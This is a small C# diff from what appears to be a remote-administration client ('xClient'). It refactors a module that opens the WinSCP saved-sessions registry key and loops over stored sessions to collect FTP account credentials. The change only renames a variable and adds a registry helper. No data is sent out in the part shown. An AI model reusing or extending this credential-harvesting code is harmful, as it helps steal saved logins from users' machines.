@@ -4,6 +4,7 @@ using System.Collections.Generic;
 using System.Linq;
 using xClient.Core.Data;
 using xClient.Core.Extensions;
+using xClient.Core.Helper;
 
 namespace xClient.Core.Recovery.FtpClients
 {
@@ -14,9 +15,9 @@ namespace xClient.Core.Recovery.FtpClients
             List<RecoveredAccount> data = new List<RecoveredAccount>();
             try
             {
-                string RegKey = @"SOFTWARE\\Martin Prikryl\\WinSCP 2\\Sessions";
+                string regPath = @"SOFTWARE\\Martin Prikryl\\WinSCP 2\\Sessions";
 
-                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(RegKey))
+                using (RegistryKey key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.CurrentUser, regPath))
                 {
                     foreach (String subkeyName in key.GetSubKeyNames())
                     {
